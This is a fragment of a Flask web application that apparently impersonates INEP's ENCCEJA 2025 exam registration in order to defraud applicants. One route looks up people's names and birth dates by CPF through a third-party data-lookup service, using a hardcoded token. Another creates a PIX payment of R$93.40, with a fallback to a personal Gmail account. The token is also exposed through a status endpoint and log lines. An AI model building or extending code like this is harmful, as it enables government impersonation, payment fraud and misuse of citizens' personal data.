                    <p><strong>Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira</strong></p>
                    <p><em>Ministério da Educação - Governo Federal</em></p>
                </div>
                
                <p style="text-align: center; color: #666; font-size: 14px; margin-top: 30px;">
                    <em>Guarde esta confirmação para seus registros. Boa sorte no seu exame!</em>
                </p>
            </div>
        </body>
        </html>
        '''

# === APIS ===

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """Busca informações de um CPF na API (para a página de inscrição) - URL CORRIGIDA"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # API funcionando com URL corrigida
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_numerico}&token={token}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
        
        app.logger.info(f"Consultando API CPF: {url}")
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"Resposta da API CPF: {data}")
            
            # API retorna dados na estrutura {'DADOS': {...}}
            if data.get("DADOS"):
                dados = data["DADOS"]
                user_data = {
                    'cpf': dados.get('cpf', cpf_numerico),
                    'nome': dados.get('nome', ''),
                    'dataNascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
                    'situacaoCadastral': "REGULAR",
                    'telefone': '',
                    'email': '',
                    'sucesso': True
                }
                
                # Salvar na sessão
                session['user_data'] = user_data
                
                app.logger.info(f"CPF consultado com sucesso: {cpf}")
                return jsonify(user_data)
            else:
                app.logger.error(f"API não retornou DADOS: {data}")
                return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
        else:
            app.logger.error(f"Erro de conexão com a API: {response.status_code}")
            return jsonify({"error": f"Erro de conexão com a API: {response.status_code}", "sucesso": False}), 500
    
    except Exception as e:
        app.logger.error(f"Erro ao buscar CPF na API: {str(e)}")
        return jsonify({"error": f"Erro interno: {str(e)}", "sucesso": False}), 500

@app.route('/criar-pagamento-pix', methods=['POST'])
@check_referer
def criar_pagamento_pix():
    """Criar pagamento PIX usando WitePay com fallback"""
    try:
        user_data = session.get('user_data', {})
        
        if not user_data:
            return jsonify({'success': False, 'error': 'Dados do usuário não encontrados'}), 400
        
        app.logger.info(f"Criando pagamento PIX para {user_data.get('nome', 'N/A')}")
        
        # Usar função de criação de pagamento
        payment_result = create_witepay_payment(user_data, 93.40)
        
        return jsonify(payment_result)
        
    except Exception as e:
        app.logger.error(f"Erro ao criar PIX: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# === ROTAS DE SISTEMA ===

@app.route('/status')
def status():
    """Status do sistema"""
    return jsonify({
        'status': 'online',
        'projeto': 'ENCCEJA 2025 Final Limpo',
        'api_cpf': 'https://consulta.fontesderenda.blog/cpf.php',
        'token': '1285fe4s-e931-4071-a848-3fac8273c55a',
        'payment': 'WitePay + Fallback PIX',
        'sms': 'Removido',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health():  
    """Health check"""
    return "OK - ENCCEJA 2025 Final", 200

@app.route('/test-cpf/<cpf>')
def test_cpf(cpf):
    """Testar API CPF diretamente"""
    try:
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf}&token={token}"
        response = requests.get(url, timeout=10)
        return jsonify({
            'url': url,
            'status': response.status_code,
            'data': response.json() if response.status_code == 200 else response.text
        })
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    app.logger.info("=== ENCCEJA 2025 - APLICAÇÃO FINAL LIMPA ===")
    app.logger.info("✅ API CPF: https://consulta.fontesderenda.blog/cpf.php")
    app.logger.info("✅ Token: 1285fe4s-e931-4071-a848-3fac8273c55a")
    app.logger.info("✅ Fluxo: inscricao → encceja-info → validar-dados → endereco → local-prova → pagamento → sucesso")
    app.logger.info("✅ Templates: Com fallback HTML completo")
    app.logger.info("✅ WitePay: Com fallback para PIX direto gerarpagamentos@gmail.com")
    app.logger.info("✅ SMS: Removido")
    app.logger.info("✅ For4Payments: Removido")
    app.logger.info("Iniciando na porta 5000...")
    app.run(host='0.0.0.0', port=5000, debug=True)